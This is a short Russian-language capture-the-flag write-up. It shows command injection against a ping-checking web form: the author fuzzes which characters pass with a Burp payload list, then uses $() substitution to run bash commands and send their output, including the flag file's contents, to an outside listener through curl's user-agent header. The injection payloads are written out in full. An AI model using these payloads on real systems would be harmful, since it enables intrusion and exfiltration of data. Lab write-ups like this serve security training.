
Есть сайт который проверяет доступность Ip/ domain с помощью ping также имеется фильтры символов

Через бурп прогоним список [PayloadsAllTheThings/Command Injection/Intruder/command_exec.txt at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt) для проверки символов
![](../../attachment/Pasted%20image%2020250417163011.png)

![](../../attachment/Pasted%20image%2020250417163017.png)

$('') доступны
 попробуем отправить 
google.com $(curl 100.100.2.252:6655) и получим ответ
![](../../attachment/Pasted%20image%2020250417164128.png)
Попробуем изучить систему используя bash -c
```
google.com $(curl 100.100.2.252:6655 --user-agent "$(bash -c 'ls')")
```

![](../../attachment/Pasted%20image%2020250417164317.png)

Изучив файлы видим что флаг находится в корне
![](../../attachment/Pasted%20image%2020250417164345.png)
С помощью команды find ..  и -exec найдем файл в корне и прочитаем его и забираем флаг
```
google.com $(curl 100.100.2.252:6655 --user-agent "$(bash -c 'find .. -name "fla*.txt" -exec cat {} +')")
```
